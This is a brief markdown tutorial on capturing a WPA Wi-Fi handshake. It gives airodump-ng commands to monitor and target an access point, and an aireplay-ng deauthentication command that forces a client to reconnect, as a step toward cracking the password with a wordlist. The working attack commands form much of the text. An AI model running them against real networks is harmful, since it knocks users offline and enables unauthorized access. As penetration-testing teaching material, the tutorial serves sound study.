## Basic Theory : 
- Everytime a client associates with the target AP, a Handshake occurs 🤝.

- To start the Attack we need to run the **airodump-ng**.
- Now wait for the client to connect or just deauthenticate the client/clients for a very short period of  time. ( so that they will connect back automatically )
- A handshake will occur and we will capture it.

- - -
# Practical : 

#### Run airodump-ng : 

```sh
airodump-ng mon0 
```

![Imgur](https://i.imgur.com/aPh8VwW.png)

#### Run airodump-ng on a target AP : 
Keep running it.

```sh
airodump-ng --bssid <APs_MAC> --channel 69 --write test-handshake mon0 
```

![Imgur](https://i.imgur.com/JJeGb4u.png)

#### Perform Deauthentication : 

```sh
aireplay-ng --deauth 4 -a <APs_MAC> -c <Client_MAC> mon0 
```

![Imgur](https://i.imgur.com/kf4h3P1.png)

And our **Airodump-ng** will capture the handshake.
![Imgur](https://i.imgur.com/EOFZIsq.png)

Now we have captured the **Handshake**, it's time to create a wordlist and crack it.
